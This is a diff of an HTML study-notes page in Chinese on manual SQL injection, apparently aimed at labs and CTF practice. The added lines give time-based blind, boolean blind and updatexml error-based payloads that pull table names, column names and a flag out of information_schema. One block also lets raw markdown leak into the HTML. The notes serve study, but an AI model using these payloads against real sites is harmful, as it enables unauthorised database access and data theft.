@@ -395,6 +395,10 @@
 <p>concat和group_concat都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号</p>
 <h1 id="手注如何判断sql注入"><a href="#手注如何判断sql注入" class="headerlink" title="手注如何判断sql注入"></a>手注如何判断sql注入</h1><p><code>&#39;</code> 判断有没有对字符处理</p>
 <p><code>and 1=1</code> 判断</p>
+<p>时间盲注判断</p>
+<pre><code class="sql">1&#39;+AND+(SELECT*FROM+(SELECT+SLEEP(5))a)+AND+&#39;1&#39;=&#39;1&#39;
+</code></pre>
+<p>其中a为<code>SELECT+SLEEP(5)</code>的别名</p>
 <h1 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h1><p><code>sleep(n)</code> &#x3D;– 返回0 命令中断返回1</p>
 <p><code>substr(a,b,c)</code></p>
 <p><code>count()</code> – 计算总数</p>
@@ -406,8 +410,19 @@
 <p>盲注情况下用 substr (变种mid())获取数据</p>
 <pre><code class="sql">select substr(database(),2,1) = &#39;q&#39; and sleep(2) 
 </code></pre>
-<h2 id="变种mid"><a href="#变种mid" class="headerlink" title="变种mid()"></a>变种mid()</h2><p>用法和 substr 相同</p>
-<h2 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h2><pre><code class="sql">select left(&#39;awaawawa&#39;,3) #return awa
+<h2 id="获取table-name"><a href="#获取table-name" class="headerlink" title="获取table_name"></a>获取table_name</h2><pre><code class="sql"> and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))=101  --+ 
+</code></pre>
+<p>获取长度</p>
+<pre><code class="sql"> and length((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;))&gt;1  --+ ```
+
+## 变种mid() ##
+
+用法和 substr 相同
+
+## left() ##
+
+```sql
+select left(&#39;awaawawa&#39;,3) #return awa
 </code></pre>
 <h1 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h1><p>用 ascii()  (变种ord) 转换为ascii码</p>
 <pre><code class="sql">select ascii(substr(database(),2,1)) = 33 and sleep(2);
@@ -420,6 +435,11 @@
 <pre><code class="sql">rand(int) #只要int值相等，最后的随机数也相等
 </code></pre>
 <h1 id="floor-x-返回一个小于x的整数"><a href="#floor-x-返回一个小于x的整数" class="headerlink" title="floor(x) 返回一个小于x的整数"></a>floor(x) 返回一个小于x的整数</h1><pre><code class="sql">select floor(1.1)/*1*/,floor(0.99)/*0*/,floor(2.1)/*2*/
+</code></pre>
+<h1 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h1><pre><code class="sql">updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+
+</code></pre>
+<p>被截断</p>
+<pre><code class="sql">updatexml(1,(mid(concat(0x7e,(select flag from flag limit 0,1),0x7e),0,31)),3) --+
 </code></pre>
 
         </div>
